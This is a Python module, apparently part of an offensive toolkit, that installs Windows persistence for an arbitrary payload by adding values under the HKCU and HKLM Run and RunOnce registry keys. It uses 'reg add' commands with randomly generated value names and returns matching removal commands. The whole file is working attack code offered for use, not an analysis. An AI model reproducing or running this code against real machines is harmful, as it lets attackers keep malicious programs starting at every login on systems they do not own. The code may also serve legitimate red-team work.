"""
Run and RunOnce registry key persistence methods
"""

import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.utils import run_command, generate_random_name, validate_payload_path, check_admin
from config import REGISTRY_PATHS


class RunKeyPersistence:
    """Handles Run and RunOnce key persistence methods"""
    
    def __init__(self):
        self.is_admin = check_admin()
    
    def install_hkcu_run(self, payload_path, name=None):
        """
        Install persistence via HKCU Run key
        Most common method - executes on user login
        
        Args:
            payload_path (str): Path to payload
            name (str): Registry value name (auto-generated if None)
            
        Returns:
            dict: Installation result with removal command
        """
        print("[*] Installing HKCU Run Key persistence...")
        
        # Validate payload
        is_valid, error = validate_payload_path(payload_path)
        if not is_valid:
            print(f"[-] Invalid payload: {error}")
            return None
        
        if name is None:
            name = generate_random_name()
        
        reg_path = REGISTRY_PATHS['hkcu_run']
        command = f'reg add "{reg_path}" /v "{name}" /t REG_SZ /d "{payload_path}" /f'
        
        result = run_command(command)
        
        if result and result['success']:
            print(f"[+] Persistence installed successfully!")
            print(f"    Location: {reg_path}")
            print(f"    Name: {name}")
            print(f"    Payload: {payload_path}")
            print(f"    Trigger: User login")
            print(f"    Admin Required: No")
            
            return {
                'method': 'run_key',
                'name': name,
                'path': reg_path,
                'payload': payload_path,
                'requires_admin': False,
                'remove_command': f'reg delete "{reg_path}" /v "{name}" /f'
            }
        else:
            print(f"[-] Failed to install persistence")
            if result:
                print(f"    Error: {result.get('stderr', 'Unknown error')}")
            return None
    
    def install_hklm_run(self, payload_path, name=None):
        """
        Install persistence via HKLM Run key
        Requires admin - executes for all users
        
        Args:
            payload_path (str): Path to payload
            name (str): Registry value name (auto-generated if None)
            
        Returns:
            dict: Installation result with removal command
        """
        print("[*] Installing HKLM Run Key persistence...")
        
        if not self.is_admin:
            print("[!] This method requires administrator privileges")
            print("    Run the script as Administrator to use this method")
            return None
        
        # Validate payload
        is_valid, error = validate_payload_path(payload_path)
        if not is_valid:
            print(f"[-] Invalid payload: {error}")
            return None
        
        if name is None:
            name = generate_random_name()
        
        reg_path = REGISTRY_PATHS['hklm_run']
        command = f'reg add "{reg_path}" /v "{name}" /t REG_SZ /d "{payload_path}" /f'
        
        result = run_command(command, require_admin=True)
        
        if result and result['success']:
            print(f"[+] Persistence installed successfully!")
            print(f"    Location: {reg_path}")
            print(f"    Name: {name}")
            print(f"    Payload: {payload_path}")
            print(f"    Trigger: Any user login")
            print(f"    Admin Required: Yes")
            
            return {
                'method': 'run_key_local_machine',
                'name': name,
                'path': reg_path,
                'payload': payload_path,
                'requires_admin': True,
                'remove_command': f'reg delete "{reg_path}" /v "{name}" /f'
            }
        else:
            print(f"[-] Failed to install persistence")
            if result:
                print(f"    Error: {result.get('stderr', 'Unknown error')}")
            return None
    
    def install_runonce(self, payload_path, name=None, hklm=False):
        """
        Install persistence via RunOnce key
        Executes once on next login then removes itself
        
        Args:
            payload_path (str): Path to payload
            name (str): Registry value name (auto-generated if None)
            hklm (bool): Use HKLM instead of HKCU (requires admin)
            
        Returns:
            dict: Installation result with removal command
        """
        scope = "HKLM" if hklm else "HKCU"
        print(f"[*] Installing {scope} RunOnce persistence...")
        
        if hklm and not self.is_admin:
            print("[!] HKLM RunOnce requires administrator privileges")
            return None
        
        # Validate payload
        is_valid, error = validate_payload_path(payload_path)
        if not is_valid:
            print(f"[-] Invalid payload: {error}")
            return None
        
        if name is None:
            name = generate_random_name()
        
        reg_path = REGISTRY_PATHS['hklm_run_once'] if hklm else REGISTRY_PATHS['hkcu_run_once']
        command = f'reg add "{reg_path}" /v "{name}" /t REG_SZ /d "{payload_path}" /f'
        
        result = run_command(command, require_admin=hklm)
        
        if result and result['success']:
            print(f"[+] Persistence installed successfully!")
            print(f"    Location: {reg_path}")
            print(f"    Name: {name}")
            print(f"    Payload: {payload_path}")
            print(f"    Trigger: Next login (single execution)")
            print(f"    Admin Required: {'Yes' if hklm else 'No'}")
            print(f"    Note: This persistence will self-remove after execution")
            
            return {
                'method': 'run_once_key',
                'name': name,
                'path': reg_path,
                'payload': payload_path,
                'requires_admin': hklm,
                'single_use': True,
                'remove_command': f'reg delete "{reg_path}" /v "{name}" /f'
            }
        else:
            print(f"[-] Failed to install persistence")
            if result:
                print(f"    Error: {result.get('stderr', 'Unknown error')}")
            return None